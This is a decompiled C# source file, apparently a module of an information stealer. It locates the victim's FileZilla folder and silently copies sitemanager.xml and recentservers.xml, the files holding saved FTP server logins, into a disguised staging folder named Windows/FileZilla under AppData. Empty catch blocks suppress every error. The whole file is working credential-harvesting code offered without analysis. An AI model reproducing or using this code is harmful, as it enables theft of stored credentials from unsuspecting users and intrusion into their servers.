using System;
using System.IO;

namespace f1lezilla
{
	// Token: 0x0200000C RID: 12
	internal class filezilla
	{
		// Token: 0x06000018 RID: 24 RVA: 0x0000346C File Offset: 0x0000166C
		public static void file()
		{
			try
			{
				string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla";
				bool flag = Directory.Exists(path);
				if (flag)
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/FileZilla");
					string[] files = Directory.GetFiles(path);
					foreach (string text in files)
					{
						bool flag2 = text == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml";
						if (flag2)
						{
							try
							{
								File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/FileZilla/sitemanager.xml");
							}
							catch
							{
							}
						}
						bool flag3 = text == Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
						if (flag3)
						{
							try
							{
								File.Copy(text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/FileZilla/recentservers.xml");
							}
							catch
							{
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
